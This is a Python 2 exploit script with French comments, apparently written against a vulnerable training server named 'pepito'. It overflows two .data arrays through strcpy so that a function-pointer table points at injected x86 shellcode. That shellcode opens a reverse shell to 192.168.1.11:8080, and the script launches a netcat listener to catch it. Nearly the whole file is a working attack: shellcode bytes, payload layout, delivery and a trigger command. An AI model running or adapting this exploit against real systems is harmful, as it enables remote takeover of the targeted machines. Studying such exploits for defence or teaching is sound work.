#!/usr/bin/env python2
# sploit le strcpy pour depasser sur le tableau guestBook et password pour attendre
# le tableau de pointeur sur fonction de handlerTab

# $>objdump -x ../../../src/pepito_jo/pepito | grep handlerTab
# 0804ae80 l     O .data	00000014              handlerTab
# $> objdump -x ../../../src/pepito_jo/pepito | grep password
# 0804ac80 l     O .data	00000200              password
# $> objdump -x ../../../src/pepito_jo/pepito | grep guestBook
# 0804aa80 l     O .data	00000200              guestBook

# Ok donc nous avons en premier notre tableau guestBook ensuite notre tableau de password
# puis nous tapons apres dans le tableau de handlerTab

# Constitution du tableau handlerTab
# +====================================================================
# | 804ae80
# | .......   ;********************************************************
# | .......   ; data object handlerTab, size 20 (local)
# | .......   ;********************************************************
# | .......   handlerTab:                     ;xref r8048e77
# | .......     dd          08048bcah
# | 804ae84     db          77h ; 'w'
# | 804ae85     db          8ch ; '?'
# | 804ae86     db          04h ; ' '
# | 804ae87     db          08h ; ' '
# | 804ae88     db          91h ; '?'
# | 804ae89     db          8dh ; '?'
# | 804ae8a     db          04h ; ' '
# | 804ae8b     db          08h ; ' '
# | 804ae8c     db          33h ; '3'
# | 804ae8d     db          8dh ; '?'
# | 804ae8e     db          04h ; ' '
# | 804ae8f     db          08h ; ' '
# | 804ae90     db          00h ; ' '
# | 804ae91     db          00h ; ' '
# | 804ae92     db          00h ; ' '
# | 804ae93     db          00h ; ' '

import socket
import os
import time
import sys

if len(sys.argv) != 3:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

# connect back 192.168.1.11:8080
# nc -l -vvv -p 8080
shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
            "\x5b\x5e\x68\xc0\xa8\x01\x0b\x66\x68\x1f\x90\x66\x53\x6a\x10" \
            "\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f" \
            "\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
            "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

password   = shellcode
size       = len(shellcode)
password  += "\x90" * (512 - size)
guestBook  = "A" * 512

handlerTab = "\x80\xac\x04\x08" # EIP 0x0804ac80 => password
cmdID      = "1"
arg2       = str(len(guestBook) + len(password) + len(handlerTab) + 1)
payload    = cmdID + " " + arg2 + guestBook + password + handlerTab

print "[+] Try to send payload"
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload1"
   sys.exit(1)

print "[+] .data overwrited!"
print "[+] run a terminal for catch reverse TCP"
os.system("gnome-terminal -e \"nc -l -vvv -p 8080\"")
time.sleep(2)
print "[+] Execute payload in server"

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

try:
   s.send("0 5 pown")
   s.close
except:
   print "[-] Error send payload1"
   sys.exit(1)
